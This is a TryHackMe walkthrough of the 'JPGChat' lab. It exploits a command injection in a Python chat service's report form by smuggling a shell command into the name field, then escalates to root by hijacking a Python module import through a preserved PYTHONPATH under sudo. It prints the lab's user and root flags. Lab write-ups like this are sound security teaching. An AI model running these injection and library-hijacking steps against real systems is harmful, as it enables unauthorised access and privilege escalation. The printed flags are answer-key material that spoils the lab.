# JPGChat - TryHackMe Walkthrough

**Target IP:** 10.48.167.235
**Date:** February 28, 2026

## 1. Foothold & User Flag

### Enumeration
An Nmap scan revealed two open ports:
- **22/tcp**: SSH
- **3000/tcp**: JPChat service

Connecting to port 3000 via `netcat` provides a welcome message:
```bash
nc 10.48.167.235 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

The admin name is **Mozzie-jpg**, and the source code is at `https://github.com/Mozzie-jpg/JPChat`.

### Vulnerability Analysis
The source code `jpchat.py` reveals a command injection vulnerability in the `report_form` function:
```python
def report_form():
    your_name = input('your name:\n')
    report_text = input('your report:\n')
    os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
    os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```
The `your_name` and `report_text` inputs are passed directly into `os.system` without sanitization.

### Exploitation
We can inject arbitrary commands. For example, to read the user flag:
```bash
echo -e "[REPORT]\nabhi\n'; cat /home/wes/user.txt; echo '" | nc 10.48.167.235 3000
```
**User Flag:** `JPC{487030410a543503cbb59ece16178318}`

---

## 2. Privilege Escalation & Root Flag

### Enumeration
Checking sudo permissions for user `wes`:
```bash
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
Crucially, the `PYTHONPATH` environment variable is preserved (`env_keep+=PYTHONPATH`).

### Vulnerability Analysis
The script `/opt/development/test_module.py` contains:
```python
from compare import *
print(compare.Str('hello', 'hello', 'hello'))
```
It attempts to import a module named `compare`.

### Exploitation (Python Library Hijacking)
By creating a malicious `compare.py` in `/tmp` and pointing `PYTHONPATH` to it, we can execute arbitrary code as root when running the sudo command.

1. Create the malicious module:
   ```bash
   echo 'import os; os.system("cat /root/root.txt")' > /tmp/compare.py
   ```
2. Execute the script with sudo while setting PYTHONPATH:
   ```bash
   PYTHONPATH=/tmp sudo /usr/bin/python3 /opt/development/test_module.py
   ```

**Root Flag:** `JPC{665b7f2e59cf44763e5a7f070b081b0a}`
